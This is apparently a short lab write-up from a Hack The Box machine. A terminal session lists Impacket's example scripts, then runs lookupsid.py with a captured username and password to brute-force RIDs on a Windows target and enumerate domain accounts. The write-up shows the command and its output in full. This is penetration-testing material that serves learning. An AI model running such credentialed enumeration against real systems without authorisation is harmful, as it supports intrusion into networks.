# SID\(/RID\) Bruteforce with Python's Impacket

```text
root@kavishgr:~/AutoRecon/results/heistHTB/loot# cd /usr/share/doc/python3-impacket/examples/
root@kavishgr:/usr/share/doc/python3-impacket/examples# ls
atexec.py      getPac.py       kintercept.py     nmapAnswerMachine.py  raiseChild.py     secretsdump.py  sniff.py
dcomexec.py    getST.py        lookupsid.py      ntfs-read.py          rdp_check.py      services.py     split.py
dpapi.py       getTGT.py       mimikatz.py       ntlmrelayx.py         registry-read.py  smbclient.py    ticketer.py
esentutl.py    GetUserSPNs.py  mqtt_check.py     opdump.py             reg.py            smbexec.py      wmiexec.py
GetADUsers.py  goldenPac.py    mssqlclient.py    ping6.py              rpcdump.py        smbrelayx.py    wmipersist.py
getArch.py     ifmap.py        mssqlinstance.py  ping.py               sambaPipe.py      smbserver.py    wmiquery.py
GetNPUsers.py  karmaSMB.py     netview.py        psexec.py             samrdump.py       sniffer.py
root@kavishgr:/usr/share/doc/python3-impacket/examples# python3 lookupsid.py 'hazard:stealth1agent'@10.10.10.149
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
root@kavishgr:/usr/share/doc/python3-impacket/examples# 

```



